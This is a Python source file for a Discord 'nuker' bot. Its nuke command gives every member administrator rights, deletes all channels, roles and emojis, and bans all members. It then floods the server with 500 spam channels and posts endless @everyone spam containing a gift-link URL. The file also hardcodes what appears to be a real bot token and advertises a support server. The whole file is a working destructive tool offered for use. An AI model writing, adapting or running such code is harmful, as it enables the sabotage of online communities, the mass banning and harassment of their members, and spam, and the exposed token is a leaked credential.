import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore


token = "OTU3OTYyOTYwOTg1MjYwMTMy.GbtU0W.gmZbOQrRJ0OFtv4c4dMTI6JBTzQYg4111ccxvU"

SPAM_CHANNEL = ["no-name-on-top"]
SPAM_MESSAGE = [
    "@everyone https://gift.truemoney.com/campaign/?v="
]

client = commands.Bot(command_prefix="pl!")


@client.event
async def on_ready():
    print( Fore.LIGHTWHITE_EX + '''      
          
          

██████╗░░█████╗░██╗░░░░░░█████╗░██╗░░░░░██╗░██████╗░██╗░░██╗████████╗
██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░░░░░██║██╔════╝░██║░░██║╚══██╔══╝
██████╔╝███████║██║░░░░░███████║██║░░░░░██║██║░░██╗░███████║░░░██║░░░
██╔═══╝░██╔══██║██║░░░░░██╔══██║██║░░░░░██║██║░░╚██╗██╔══██║░░░██║░░░
██║░░░░░██║░░██║███████╗██║░░██║███████╗██║╚██████╔╝██║░░██║░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░           
                                  

Support Server: 
     https://discord.gg/f3Q3bMvHxQ
                     
[+] pl!nuke
[+] pl!stop
          
    
''')




@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." +
          Fore.RESET)


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all)
        print(Fore.GREEN + "I   have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN+ "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f" [+] {channel.name} was deleted." +
                  Fore.RESET)
        except:
            print(Fore.MAGENTA + f" [+] {channel.name}  was NOT deleted." +
                  Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA +
                  f"{member.name}#{member.discriminator} Was banned" +
                  Fore.RESET)
        except:
            print(
                Fore.MAGENTA +
                f"{member.name}#{member.discriminator} Was unable to be banned."
                + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name}  Has been deleted" + Fore.RESET)
        except:
            print(Fore.LIGHTMAGENTA_EX+ f"{role.name}  Has not been deleted" +
                  Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name}  Was deleted" + Fore.RESET)
        except:
            print(Fore.LIGHTYELLOW_EX + f"{emoji.name}  Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("qrd4#6666")
            print(
                Fore.LIGHTBLUE_EX + f"{user.name}#{user.discriminator} Was successfully unbanned."
                + Fore.RESET)
        except:
            print(Fore.LIGHTWHITE_EX +
                  f"{user.name}#{user.discriminator} Was not unbanned." +
                  Fore.RESET)
    await guild.create_text_channel("no-name-on-top")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


client.run(token, bot=True)

